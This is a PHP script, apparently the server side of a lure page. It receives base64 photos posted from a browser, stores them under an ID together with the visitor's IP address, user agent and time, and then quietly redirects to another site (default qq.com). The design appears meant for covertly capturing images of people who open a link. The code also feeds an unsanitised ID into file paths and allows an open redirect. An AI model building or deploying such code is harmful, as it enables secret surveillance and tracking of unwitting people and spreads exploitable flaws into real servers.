<?php
// qbl.php - 接收并保存照片
error_reporting(0);

// 获取参数
$id = $_GET['id'] ?? '';
$url = $_GET['url'] ?? 'http://qq.com';

// 接收Base64图片数据
$imgData = $_POST['img'] ?? '';

// 验证ID
if (empty($id)) {
    header("Location: $url");
    exit;
}

// 处理Base64图片
if (!empty($imgData)) {
    // 提取Base64数据
    if (strpos($imgData, 'base64,') !== false) {
        $imgData = explode('base64,', $imgData)[1];
    }
    
    // 解码Base64
    $imgData = base64_decode($imgData);
    
    // 确保images目录存在
    if (!is_dir('images')) {
        mkdir('images', 0755, true);
    }
    
    // 保存图片文件
    $filename = "images/{$id}_" . time() . ".jpg";
    file_put_contents($filename, $imgData);
    
    // 同时保存一份以ID命名的文件（用于ck.php查询）
    copy($filename, "images/{$id}.jpg");
    
    // 保存记录（可选）
    if (!is_dir('data')) {
        mkdir('data', 0755, true);
    }
    
    $record = [
        'id' => $id,
        'time' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'photo_file' => $filename
    ];
    
    file_put_contents("data/{$id}.json", json_encode($record));
    
    // 记录日志（可选）
    if (!is_dir('logs')) {
        mkdir('logs', 0755, true);
    }
    
    $log = date('Y-m-d H:i:s') . " | ID: {$id} | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    file_put_contents('logs/access.log', $log, FILE_APPEND);
}

// 跳转到指定URL
header("Location: $url");
exit;
?>
